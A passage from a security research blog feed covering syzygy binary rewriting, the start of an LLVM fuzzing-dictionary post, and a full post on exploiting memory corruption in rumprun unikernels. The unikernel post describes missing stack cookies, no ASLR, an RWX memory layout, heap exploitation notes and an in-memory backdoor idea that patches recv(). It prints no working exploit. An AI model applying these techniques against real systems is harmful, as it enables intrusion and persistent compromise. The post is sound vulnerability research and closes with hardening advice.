</span><span class='line'>                <span class="nf">mov</span>     <span class="nb">ds</span><span class="p">:</span><span class="mh">0DEADBEEFh</span><span class="p">,</span> <span class="nb">eax</span>
</span></code></pre></td></tr></table></div></figure>


<h3>One does not simply binary rewrite</h3>

<p>It may look like an easy problem without any pitfall, but before settling down on the solution above I actually first tried to rewrite the <code>__security_check_cookie</code> function. I thought it would be cleaner and it was also very easy to do with syzygy. I had to create a new Block, and transfer the referrers to my new block and.. that was it!</p>

<p>Now it was working fine on a bunch of targets on various OSs: Windows 7, Windows 8, Windows 8.1, Windows 10. Until I started notice some instrumented binaries that would not even execute; the loader would not load the binary and I was left with some message box telling me the binary could not be loaded in memory: <code>STATUS_INVALID_IMAGE_FORMAT</code> or <code>0xc000007b</code>. This was pretty mysterious at first as the instrumented binary would run fine on Windows 7 but not on Windows 10. The instrumented binary also looked instrumented fine &ndash; the way I wanted it to be instrumented: all the callers of <code>__security_check_cookie</code> were now calling into my new function and nothing seemed off.</p>

<p>At this point, the only thing I knew was that the PE loader was not happy with the file; so that is where I started my investigation. After hours of back and forth between ntdll and the kernel I found that the CFG <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547(v=vs.85).aspx">LoadConfigDirectory.GuardCFFunctionTable</a> table (where the compiler puts all the valid indirect-call targets) embedded in binaries is expected to be <em>ordered</em> from low to high RVAs. I have also realized at this point that one of the referrer of my block was this CFG table, that would get fixed-up with the RVA of wherever the new block was placed by the binary rewriting framework. And of course, in some cases this RVA would end up being greater than the RVA right after in the table&hellip; upsetting the loader.</p>

<p><img class="center" src="http://doar-e.github.io/images/binary_rewriting_with_syzygy/security_cookie_GuardCFFunctionTable.png"></p>

<p>All of this to say that even though the framework is robust, binary rewriting can be hard when instrumenting unknown target that may make assumptions on the way their functions look, or how some part of the code / data is laid out, etc. So keep that in mind while playing :).</p>

<h1>Last words</h1>

<p>In this post I have introduced the syzygy framework, presented some of its strengths as well as limitations, and illustrated what can you do with it on two simple examples. I am hoping to be able to write a second post where I can talk a bit more of two other transforms I have designed to built the <a href="https://github.com/ivanfratric/winafl#statically-instrument-a-binary-via-syzygy">static instrumentation</a> mode of <a href="https://github.com/ivanfratric/winafl">WinAFL</a> and how every pieces work together. I would also like to try to see if I can&rsquo;t cook some obfuscation or something of the sort.</p>

<p>As usual you can find the codes on my github here: <a href="https://github.com/0vercl0k/stuffz/blob/master/syzygy/binary_rewriting_with_syzygy_pt._i.diff">stuffz/syzygy</a>.</p>

<p>If you can&rsquo;t wait for the next post, you can have already a look at <a href="https://github.com/google/syzygy/blob/master/syzygy/instrument/transforms/add_implicit_tls_transform.cc">add_implicit_tls_transform.cc</a> and <a href="https://github.com/google/syzygy/blob/master/syzygy/instrument/transforms/afl_transform.cc">afl_transform.cc</a>.</p>

<p>Last but not least, special shout-outs to my proofreader <a href="https://twitter.com/yrp604">yrp</a>.</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[happy unikernels]]></title>
    <link href="http://doar-e.github.io/blog/2016/12/21/happy-unikernels/"/>
    
    <updated>2016-12-21T18:59:00-08:00</updated>
    <id>http://doar-e.github.io/blog/2016/12/21/happy-unikernels</id>
    
    <content type="html"><![CDATA[<h1>Intro</h1>

<p>Below is a collection of notes regarding unikernels. I had originally prepared this stuff to submit to EkoParty’s CFP, but ended up not wanting to devote time to stabilizing PHP7’s heap structures and I lost interest in the rest of the project before it was complete. However, there are still some cool takeaways I figured I could write down. Maybe they’ll come in handy? If so, please let let me know.</p>

<p>Unikernels are a continuation of turning everything into a container or VM. Basically, as many VMs currently just run one userland application, the idea is that we can simplify our entire software stack by removing the userland/kernelland barrier and essentially compiling our usermode process into the kernel. This is, in the implementation I looked at, done with a NetBSD kernel and a variety of either <a href="https://github.com/rumpkernel/rumprun-packages">native or lightly-patched POSIX applications</a>  (bonus: there is significant lag time between upstream fixes and rump package fixes, just like every other containerized solution).</p>

<p>While I don’t necessarily think that conceptually unikernels are a good idea (attack surface reduction vs mitigation removal), I do think people will start more widely deploying them shortly and I was curious what memory corruption exploitation would look like inside of them, and more generally what your payload options are like.</p>

<p>All of the following is based off of two unikernel programs, nginx and php5 and only makes use of public vulnerabilities. I am happy to provide all referenced code (in varying states of incompleteness), on request.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>Basic ‘Hello World’ Example</h1>

<p>To get a basic understanding of a unikernel, we’ll walk through a simple ‘Hello World’ example. First, you’ll need to clone and build (<code>./build-rr.sh</code>) the <a href="https://github.com/rumpkernel/rumprun">rumprun</a> toolchain. This will set you up with the various utilities you&rsquo;ll need.</p>

<h2>Compiling and ‘Baking’</h2>

<p>In a rumpkernel application, we have a standard POSIX environment, minus anything involving multiple processes. Standard memory, file system, and networking calls all work as expected. The only differences lie in the multi-process related calls such as <code>fork()</code>, <code>signal()</code>, <code>pthread_create()</code>, etc. The scope of these differences can be found in the <a href="http://www.fixup.fi/misc/rumpkernel-book/rumpkernel-bookv2-20160802.pdf">The Design and Implementation of the Anykernel and Rump Kernels [pdf]</a>.</p>

<p>From a super basic, standard ‘hello world’ program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>After building <code>rumprun</code> we should have a new compiler, <code>x86_64-rumprun-netbsd-gcc</code>. This is a cross compiler targeting the rumpkernel platform. We can compile as normal <code>x86_64-rumprun-netbsd-gcc hello.c -o hello-rump</code> and in fact the output is an ELF: <code>hello-rump: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</code>. However, as we obviously cannot directly boot an ELF we must manipulate the executable (&lsquo;baking&rsquo; in rumpkernel terms).</p>

<p>Rump kernels provide a <code>rumprun-bake</code> shell script. This script takes an ELF from compiling with the rumprun toolchain and converts it into a bootable image which we can then give to qemu or xen. Continuing in our example: <code>rumprun-bake hw_generic hello.bin hello-rump</code>, where the <code>hw_generic</code> just indicates we are targeting qemu.</p>

<h2>Booting and Debugging</h2>

<p>At this point assuming you have qemu installed, booting your new image should be as easy as <code>rumprun qemu -g "-curses" -i hello.bin</code>. If everything went according to plan, you should see something like:</p>

<p><img src="http://i.imgur.com/Or38ajp.png" alt="hello" /></p>

<p>Because this is just qemu at this point, if you need to debug you can easily attach via qemu’s system debugger. Additionally, a nice side effect of this toolchain is very easy debugging — you can essentially debug most of your problems on the native architecture, then just switch compilers to build a bootable image. Also, because the boot time is so much faster, debugging and fixing problems is vastly sped up.</p>

<p>If you have further questions, or would like more detail, the <a href="https://github.com/rumpkernel/wiki">Rumpkernel Wiki</a> has some very good documents explaining the various components and options.</p>

<h1>Peek/Poke Tool</h1>

<p>Initially to develop some familiarity with the code, I wrote a simple peek/poke primitive process. The VM would boot and expose a tcp socket that would allow clients read or write arbitrary memory, as well as wrappers around <code>malloc()</code> and <code>free()</code> to play with the heap state. Most of the knowledge here is derived from this test code, poking at it with a debugger, and reading the rump kernel source.</p>

<h2>Memory Protections</h2>

<p>One of the benefits of unikernels is you can prune components you might not need. For example, if your unikernel application does not touch the filesystem, that code can be removed from your resulting VM. One interesting consequence of this involves only running one process — because there is only one process running on the VM, there is no need for a virtual memory system to separate address spaces by process.</p>

<p>Right now this means that all memory is read-write-execute. I&rsquo;m not sure if it&rsquo;s possible to configure the MMU in a hypervisor to enforce memory proections without enabling virtual memory, as most of the virtual memory code I&rsquo;ve looked at has been related to process separation with page tables, etc. In any case, currently it’s pretty trivial to introduce new code into the system and there shouldn’t be much need to resort to ROP.</p>

<h1>nginx</h1>

<p>Nginx was the first target I looked at; I figured I could dig up the stack smash from 2013 (CVE-2013-2028) and use that as a baseline exploit to see what was possible. This ultimately failed, but exposed some interesting things along the way.</p>

<h2>Reason Why This Doesn’t Work</h2>

<p>CVE-2013-2028 is a stack buffer overflow in the nginx handler for chunked requests. I thought this would be a good test as the user controls much of the data on the stack, however, various attempts to trigger the overflow failed. Running the VM in a debugger you could see the bug was not triggered despite the size value being large enough. In fact, the syscall returned an error.</p>

<p>It turns out however that NetBSD has code to prevent against this inside the kernel:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">do_sys_recvmsg_so</span><span class="p">(</span><span class="k">struct</span> <span class="n">lwp</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="kt">int</span> <span class="n">s</span><span class="p">,</span> <span class="k">struct</span> <span class="n">socket</span> <span class="o">*</span><span class="n">so</span><span class="p">,</span> <span class="k">struct</span> <span class="n">msghdr</span> <span class="o">*</span><span class="n">mp</span><span class="p">,</span>
</span><span class='line'>      <span class="k">struct</span> <span class="n">mbuf</span> <span class="o">**</span><span class="n">from</span><span class="p">,</span> <span class="k">struct</span> <span class="n">mbuf</span> <span class="o">**</span><span class="n">control</span><span class="p">,</span> <span class="n">register_t</span> <span class="o">*</span><span class="n">retsize</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="c1">// …</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">tiov</span><span class="o">-&gt;</span><span class="n">iov_len</span> <span class="o">&gt;</span> <span class="n">SSIZE_MAX</span> <span class="o">||</span> <span class="n">auio</span><span class="p">.</span><span class="n">uio_resid</span> <span class="o">&gt;</span> <span class="n">SSIZE_MAX</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">error</span> <span class="o">=</span> <span class="n">EINVAL</span><span class="p">;</span>
</span><span class='line'>            <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="c1">// …</span>
</span></code></pre></td></tr></table></div></figure>


<p>iov_len is our <code>recv()</code> size parameter, so this bug is dead in the water. As an aside, this also made me wonder how Linux applications would respond if you passed a size greater than LONG_MAX into <code>recv()</code> and it succeeded…</p>

<h2>Something Interesting</h2>

<p>Traditionally when exploiting this bug one has to worry about stack cookies. Nginx has a worker pool of processes forked from the main process. In the event of a crash, a new process will be forked from the parent, meaning that the stack cookie will remain constant across subsequent connections. This allows you to break it down into four, 1 byte brute forces as opposed to one 4 byte, meaning it can be done in a maximum of 1024 connections. However, inside the unikernel, there is only one process — if a process crashes the entire VM must be restarted, and because the only process is the kernel, the stack cookie should (in theory) be regenerated. Looking at the disassembled nginx code, you can see the stack cookie checks in all off the relevant functions.</p>

<p>In practice, the point is moot because the stack cookies are always zero. The compiler creates and checks the cookies, it just never populates <code>fs:0x28</code> (the location of the cookie value), so it’s always a constant value and assuming you can write null bytes, this should pose no problem.</p>

<h1>ASLR</h1>

<p>I was curious if unikernels would implement some form of ASLR, as during the build process they get compiled to an ELF (which is quite nice for analysis!) which might make position independent code easier to deal with. They don’t: all images are loaded at <code>0x100000</code>. There is however &ldquo;natures ASLR&rdquo; as these images aren’t distributed in binary form. Thus, as everyone must compile their own images, these will vary slightly depending on compiler version, software version, etc. However, even this constraint gets made easier. If you look at the format of the loaded images, they look something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x100000</span><span class="o">:</span> <span class="o">&lt;</span><span class="n">unikernel</span> <span class="n">init</span> <span class="n">code</span><span class="o">&gt;</span>
</span><span class='line'><span class="err">…</span>
</span><span class='line'><span class="mh">0x110410</span><span class="o">:</span> <span class="o">&lt;</span><span class="n">application</span> <span class="n">code</span> <span class="n">starts</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This means across any unikernel application you’ll have approximately 0x10000 bytes of fixed value, fixed location executable memory. If you find an exploitable bug it should be possible to construct a payload entirely from the code in this section. This payload could be used to leak the application code, install persistence, whatever.</p>

<h1>PHP</h1>

<p>Once nginx was off the table, I needed another application that had a rumpkernel package and a history of exploitable bugs. The PHP interpreter fits the bill. I ended up using Sean Heelan&rsquo;s PHP bug <a href="https://bugs.php.net/bug.php?id=70068">#70068</a>, because of the provided trigger in the bug description, and detailed description explaining the bug. Rather than try to poorly recap Sean&rsquo;s work, I&rsquo;d encourage you to just read the inital report if you&rsquo;re curious about the bug.</p>

<p>In retrospect, I took a poor exploitation path for this bug. Because the heap slabs have no ASLR, you can fairly confidently predict mapped addresses inside the PHP interpreter. Furthermore, by controlling the size of the payload, you can determine which bucket it will fall into and pick a lesser used bucket for more stability. This allows you to be lazy, and hard code payload addresses, leading to easy exploitation. This works very well &mdash; I was basically able to take Sean&rsquo;s trigger, slap some addresses and a payload into it, and get code exec out of it. However, the downsides to this approach quickly became apparent. When trying to return from my payload and leave the interpreter in a sane state (as in, running) I realized that I would need to actually understand the PHP heap to repair it. I started this process by examining the rump heap (see below), but got bored when I ended up in the PHP heap.</p>

<h1>Persistence</h1>

<p>This was the portion I wanted to finish for EkoParty, and it didn’t get done. In theory, as all memory is read-write-execute, it should be pretty trivial to just patch <code>recv()</code> or something to inspect the data received, and if matching some constant execute the rest of the packet. This is strictly in memory, anything touching disk will be application specific.</p>

<p>Assuming your payload is stable, you should be able to install an in-memory backdoor which will persist for the runtime of that session (and be deleted on poweroff). While in many configurations there is no writable persistent storage which will survive reboots this is not true for all unikernels (e.g. mysql). In those cases it might be possible to persist across power cycles, but this will be application specific.</p>

<p>One final, and hopefully obvious note: one of the largest differences in exploitation of unikernels is the lack of multiple processes. Exploits frequently use the existence of multiple processes to avoid cleaning up application state after a payload is run. In a unikernel, your payload must repair application state or crash the VM. In this way it is much more similar to a kernel exploit.</p>

<h1>Heap Notes</h1>

<p>The unikernel heap is quite nice from an exploitation perspective. It&rsquo;s a slab-style allocator with in-line metadata on every block. Specifically, the metadata contains the ‘bucket’ the allocation belongs to (and thus the freelist the block should be released to). This means a relative overwrite plus <code>free()</code>ing into a smaller bucket should allow for fairly fine grained control of contents. Additionally the heap is LIFO, allowing for standard heap massaging.</p>

<p>Also, while kinda untested, I believe rumpkernel applications are compiled without <code>QUEUEDEBUG</code> defined. This is relevant as the sanity checks on <code>unlink</code> operations (&ldquo;safe unlink&rdquo;) require this to be defined. This means that in some cases, if freelists themselves can be overflown then removed you can get a write-what-where. However, I think this is fairly unlikely in practice, and with the lack of memory protections elsewhere, I&rsquo;d be surprised if it would currently be useful.</p>

<p>You can find most of the relevant heap source <a href="https://github.com/rumpkernel/rumprun/blob/master/lib/libbmk_core/memalloc.c">here</a></p>

<h1>Symbol Resolution</h1>

<p>Rumpkernels helpfully include an entire syscall table under the <code>mysys</code> symbol. When rumpkernel images get loaded, the ELF header gets stripped, but the rest of the memory is loaded contigiously:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gef</span><span class="err">➤</span>  <span class="n">info</span> <span class="n">file</span>
</span><span class='line'><span class="n">Symbols</span> <span class="n">from</span> <span class="s">&quot;/home/x/rumprun-packages/php5/bin/php.bin&quot;</span><span class="p">.</span>
</span><span class='line'><span class="n">Remote</span> <span class="n">serial</span> <span class="n">target</span> <span class="n">in</span> <span class="n">gdb</span><span class="o">-</span><span class="n">specific</span> <span class="n">protocol</span><span class="o">:</span>
</span><span class='line'><span class="n">Debugging</span> <span class="n">a</span> <span class="n">target</span> <span class="n">over</span> <span class="n">a</span> <span class="n">serial</span> <span class="n">line</span><span class="p">.</span>
</span><span class='line'>        <span class="n">While</span> <span class="n">running</span> <span class="n">this</span><span class="p">,</span> <span class="n">GDB</span> <span class="n">does</span> <span class="n">not</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">from</span><span class="p">...</span>
</span><span class='line'><span class="n">Local</span> <span class="n">exec</span> <span class="n">file</span><span class="o">:</span>
</span><span class='line'>        <span class="err">`</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">x</span><span class="o">/</span><span class="n">rumprun</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">php5</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">php</span><span class="p">.</span><span class="n">bin</span><span class="err">&#39;</span><span class="p">,</span> <span class="n">file</span> <span class="n">type</span> <span class="n">elf64</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span>
</span><span class='line'>        <span class="n">Entry</span> <span class="n">point</span><span class="o">:</span> <span class="mh">0x104000</span>
</span><span class='line'>        <span class="mh">0x0000000000100000</span> <span class="o">-</span> <span class="mh">0x0000000000101020</span> <span class="n">is</span> <span class="p">.</span><span class="n">bootstrap</span>
</span><span class='line'>        <span class="mh">0x0000000000102000</span> <span class="o">-</span> <span class="mh">0x00000000008df31c</span> <span class="n">is</span> <span class="p">.</span><span class="n">text</span>
</span><span class='line'>        <span class="mh">0x00000000008df31c</span> <span class="o">-</span> <span class="mh">0x00000000008df321</span> <span class="n">is</span> <span class="p">.</span><span class="n">init</span>
</span><span class='line'>        <span class="mh">0x00000000008df340</span> <span class="o">-</span> <span class="mh">0x0000000000bba9f0</span> <span class="n">is</span> <span class="p">.</span><span class="n">rodata</span>
</span><span class='line'>        <span class="mh">0x0000000000bba9f0</span> <span class="o">-</span> <span class="mh">0x0000000000cfbcd0</span> <span class="n">is</span> <span class="p">.</span><span class="n">eh_frame</span>
</span><span class='line'>        <span class="mh">0x0000000000cfbcd0</span> <span class="o">-</span> <span class="mh">0x0000000000cfbd28</span> <span class="n">is</span> <span class="n">link_set_sysctl_funcs</span>
</span><span class='line'>        <span class="mh">0x0000000000cfbd28</span> <span class="o">-</span> <span class="mh">0x0000000000cfbd50</span> <span class="n">is</span> <span class="n">link_set_bufq_strats</span>
</span><span class='line'>        <span class="mh">0x0000000000cfbd50</span> <span class="o">-</span> <span class="mh">0x0000000000cfbde0</span> <span class="n">is</span> <span class="n">link_set_modules</span>
</span><span class='line'>        <span class="mh">0x0000000000cfbde0</span> <span class="o">-</span> <span class="mh">0x0000000000cfbf18</span> <span class="n">is</span> <span class="n">link_set_rump_components</span>
</span><span class='line'>        <span class="mh">0x0000000000cfbf18</span> <span class="o">-</span> <span class="mh">0x0000000000cfbf60</span> <span class="n">is</span> <span class="n">link_set_domains</span>
</span><span class='line'>        <span class="mh">0x0000000000cfbf60</span> <span class="o">-</span> <span class="mh">0x0000000000cfbf88</span> <span class="n">is</span> <span class="n">link_set_evcnts</span>
</span><span class='line'>        <span class="mh">0x0000000000cfbf88</span> <span class="o">-</span> <span class="mh">0x0000000000cfbf90</span> <span class="n">is</span> <span class="n">link_set_dkwedge_methods</span>
</span><span class='line'>        <span class="mh">0x0000000000cfbf90</span> <span class="o">-</span> <span class="mh">0x0000000000cfbfd0</span> <span class="n">is</span> <span class="n">link_set_prop_linkpools</span>
</span><span class='line'>        <span class="mh">0x0000000000cfbfd0</span> <span class="o">-</span> <span class="mh">0x0000000000cfbfe0</span> <span class="n">is</span> <span class="p">.</span><span class="n">initfini</span>
</span><span class='line'>        <span class="mh">0x0000000000cfc000</span> <span class="o">-</span> <span class="mh">0x0000000000d426cc</span> <span class="n">is</span> <span class="p">.</span><span class="n">data</span>
</span><span class='line'>        <span class="mh">0x0000000000d426d0</span> <span class="o">-</span> <span class="mh">0x0000000000d426d8</span> <span class="n">is</span> <span class="p">.</span><span class="n">got</span>
</span><span class='line'>        <span class="mh">0x0000000000d426d8</span> <span class="o">-</span> <span class="mh">0x0000000000d426f0</span> <span class="n">is</span> <span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span>
</span><span class='line'>        <span class="mh">0x0000000000d426f0</span> <span class="o">-</span> <span class="mh">0x0000000000d42710</span> <span class="n">is</span> <span class="p">.</span><span class="n">tbss</span>
</span><span class='line'>        <span class="mh">0x0000000000d42700</span> <span class="o">-</span> <span class="mh">0x0000000000e57320</span> <span class="n">is</span> <span class="p">.</span><span class="n">bss</span>
</span></code></pre></td></tr></table></div></figure>


<p>This means you should be able to just run simple linear scan, looking for the <code>mysys</code> table. A basic heuristic should be fine, 8 byte syscall number, 8 byte address. In the PHP5 interpreter, this table has 67 entries, giving it a big, fat footprint:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">6</span><span class="n">g</span> <span class="n">mysys</span>
</span><span class='line'><span class="mh">0xaeea60</span> <span class="o">&lt;</span><span class="n">mysys</span><span class="o">&gt;:</span>       <span class="mh">0x0000000000000003</span>      <span class="mh">0x000000000080b790</span> <span class="o">--</span> <span class="o">&lt;</span><span class="n">sys_read</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0xaeea70</span> <span class="o">&lt;</span><span class="n">mysys</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>    <span class="mh">0x0000000000000004</span>      <span class="mh">0x000000000080b9d0</span> <span class="o">--</span> <span class="o">&lt;</span><span class="n">sys_write</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0xaeea80</span> <span class="o">&lt;</span><span class="n">mysys</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>    <span class="mh">0x0000000000000006</span>      <span class="mh">0x000000000080c8e0</span> <span class="o">--</span> <span class="o">&lt;</span><span class="n">sys_close</span><span class="o">&gt;</span>
</span><span class='line'><span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>There is probably a chain of pointers in the initial constant 0x10410 bytes you could also follow, but this approach should work fine.</p>

<h1>Hypervisor fuzzing</h1>

<p>After playing with these for a while, I had another idea: rather than using unikernels to host userland services, I think there is a really cool opportunity to write a hypervisor fuzzer in a unikernel. Consider:
You have all the benefits of a POSIX userland only you’re in ring0. You don’t need to export your data to userland to get easy and familiar IO functions.
Unikernels boot really, really fast. As in under 1 second. This should allow for pretty quick state clearing.</p>

<p>This is definitely an area of interesting future work I’d like to come back to.</p>

<h1>Final Suggestions</h1>

<p>If you develop unikernels:</p>

<ul>
<li>Populate the randomness for stack cookies.</li>
<li>Load at a random location for some semblance of ASLR.</li>
<li>Is there a way you can enforce memory permissions? Some form of NX would go a long way.</li>
<li>If you can’t, some control flow integrity stuff might be a good idea? Haven’t really thought this through or tried it.</li>
<li>Take as many lessons from grsec as possible.</li>
</ul>


<p>If you’re exploiting unikernels:</p>

<ul>
<li>Have fun.</li>
</ul>


<p>If you’re exploiting hypervisors:</p>

<ul>
<li>Unikernels might provide a cool platform to easily play in ring0.</li>
</ul>


<h2>Thanks</h2>

<p>For feedback, bugs used, or editing
<a href="https://twitter.com/seanhn">@seanhn</a>, <a href="https://twitter.com/hugospns">@hugospns</a>, <a href="https://twitter.com/0vercl0k">@0vercl0k</a>, <a href="https://twitter.com/darkarnium">@darkarnium</a>, other quite helpful anonymous types.</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Token capture via an llvm-based analysis pass]]></title>
    <link href="http://doar-e.github.io/blog/2016/11/27/clang-and-passes/"/>
    
    <updated>2016-11-27T20:43:00-08:00</updated>
    <id>http://doar-e.github.io/blog/2016/11/27/clang-and-passes</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>About three years ago, the LLVM framework started to pique my interest for a lot of different reasons. This collection of industrial strength compiler technology, as <a href="http://llvm.org/pubs/2008-10-04-ACAT-LLVM-Intro.pdf">Latner</a> said in 2008, was designed in a very modular way. It also looked like it had a lot of interesting features that could be used in a lot of (different) domains: code-optimization (think <a href="https://github.com/JonathanSalwan/Tigress_protection">deobfuscation</a>), (architecture independent) <a href="https://github.com/0vercl0k/articles/blob/master/Obfuscation%20of%20steel%20meet%20Kryptonite.pdf">code obfuscation</a>, static code instrumentation (think <a href="https://github.com/google/sanitizers/wiki">sanitizers</a>), <a href="http://clang-analyzer.llvm.org/index.html">static analysis</a>, for runtime software exploitation mitigations (think <a href="http://clang.llvm.org/docs/ControlFlowIntegrity.html">cfi</a>, <a href="http://clang.llvm.org/docs/SafeStack.html">safestack</a>), power a fuzzing framework (think <a href="http://llvm.org/docs/LibFuzzer.html">libFuzzer</a>), ..you name it.</p>

<p>A lot of the power that came with this giant library was partly because it would operate in mainly three stages, and you were free to hook your code in any of those: front-end, mid-end, back-end. Other strengths included: the high number of back-ends, the documentation, the C/C++ APIs, the community, ease of use compared to gcc (see below from kcc&rsquo;s <a href="https://gcc.gnu.org/wiki/cauldron2012?action=AttachFile&amp;do=get&amp;target=kcc.pdf">presentation</a>), etc.</p>

<p><img class="center" src="http://doar-e.github.io/images/token_capture_via_llvm_based_static_analysis_pass/llvmvsgcc.png" title="GCC from a newcomer's perspective" ></p>

<p>The front-end part takes as input source code and generates LLVM IL code, the middle part operates on LLVM IL and finally the last one receives LLVM IL in order to output assembly code and or an executable file.</p>

<p><img class="center" src="http://doar-e.github.io/images/token_capture_via_llvm_based_static_analysis_pass/llvm_architecture.png" title="Major components in a three phase compiler" ></p>

<p>In this post we will walk through a simple LLVM pass that does neither optimization, nor obfuscation; but acts more as a token finder for fuzzing purposes.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>Background</h1>

<h2>Source of inspiration</h2>

<p>If you haven&rsquo;t heard of the new lcamtuf&rsquo;s coverage-guided fuzzer, it&rsquo;s most likely because you have lived in a cave for the past year or two as it has been basically mentioned everywhere (now on this blog too!). The <a href="https://github.com/mcarpenter/afl">sources</a>, the <a href="http://lcamtuf.coredump.cx/afl/README.txt">documentation</a> and the <a href="https://groups.google.com/forum/#!forum/afl-users">afl-users group</a> are really awesome resources if you&rsquo;d like to know a little bit more and follow its development.</p>

<p>What you have to know for this post though, is that the fuzzer generates test cases and will pick and keep the interesting ones based on the code-coverage that they will exercise. You end-up with a set of test cases covering different part of the code, and can spend more time hammering and mutating a small number of files, instead of a zillion. It is also packed with <a href="https://lcamtuf.blogspot.fr/2015/05/lesser-known-features-of-afl-fuzz.html">clever hacks</a> that just makes it one of the most used/easy fuzzer to use today (don&rsquo;t ask me for proof to back this claim).</p>

<p>In order to measure the code-coverage, the first version of AFL would hook in the compiler toolchain and instrument basic block in the .S files generated by gcc. The instrumentation flips a bit in a bitmap as a sign of &ldquo;I&rsquo;ve executed this part of the code&rdquo;. This tiny per-block static instrumentation (as opposed to DBI based ones) makes it hella fast, and can actually be used while fuzzing without too much of overheard. After a little bit of time, an LLVM based version has been designed (by László Szekeres and lcamtuf) in order to be less hacky, architecture independent (bonus that you get for free when writing a pass), and very elegant (no more reading/modifying raw .S files). The way this has been implemented is hooking into the mid-end in order to statically add the extra instrumentation afl-fuzz needs to have the code-coverage feedback. This is now known as <a href="https://github.com/mirrorer/afl/tree/master/llvm_mode">afl-clang-fast</a>.</p>

<p>A little later, some discussions on the googlegroup led the readers to believe that knowing &ldquo;magics&rdquo; used by a library would make the fuzzing more efficient. If I know all the magics and have a way to detect where they are located in a test-case, then I can use them instead of bit-flipping and hope it would lead to &ldquo;better&rdquo; fuzzing. This list of &ldquo;magics&rdquo; is called a  dictionary. And what I just called &ldquo;magics&rdquo; are &ldquo;tokens&rdquo;. You can provide such a dictionary (list of tokens) to afl via the -X option. In order to ease, automate the process of semi-automatically generate a dictionary file, lcamtuf developed a runtime solution based on <code>LD_PRELOAD</code> and instrumenting calls to memory compare like routines: <code>strcmp</code>, <code>memcmp</code>, etc. If one of the argument comes from a read-only section, then it is most likely a token  and it is most likely a good candidate for the dictionary. This is called <a href="https://groups.google.com/forum/#!msg/afl-users/jiQ9u5Tr5P0/nTTcBGQHCwAJ">afl-tokencap</a>.</p>

<h2>afl-llvm-tokencap</h2>

<p>What if instead of relying on a runtime solution that requires you to:</p>

<ul>
<li>Have built a complete enough corpus to exercise the code that will expose the tokens,</li>
<li>Recompile your target with a set of extra options that tell your compiler to not use the built-ins version of <code>strcmp</code>/<code>strncmp</code>/etc,</li>
